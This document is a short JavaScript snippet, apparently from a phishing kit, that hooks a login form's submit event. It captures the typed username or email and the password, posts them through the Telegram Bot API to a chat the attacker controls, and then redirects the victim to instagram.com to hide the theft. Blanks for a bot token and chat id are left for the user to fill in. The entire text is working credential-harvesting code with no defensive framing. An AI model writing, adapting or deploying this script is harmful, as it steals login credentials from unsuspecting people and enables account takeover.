<script>
  document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault();
    var usernameOrEmail = document.querySelector('input[type="text"]').value;
    var password = document.querySelector('input[type="password"]').value;

    var botToken = 'put your bot token here';
    var chatId = 'Put you telegram chat id'; 
    var message = `Username/Email: ${usernameOrEmail}\nPassword: ${password}`;
    var telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
    fetch(telegramURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent successfully:', data);
        
        window.location.href = 'https://instagram.com'; 
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
</script>
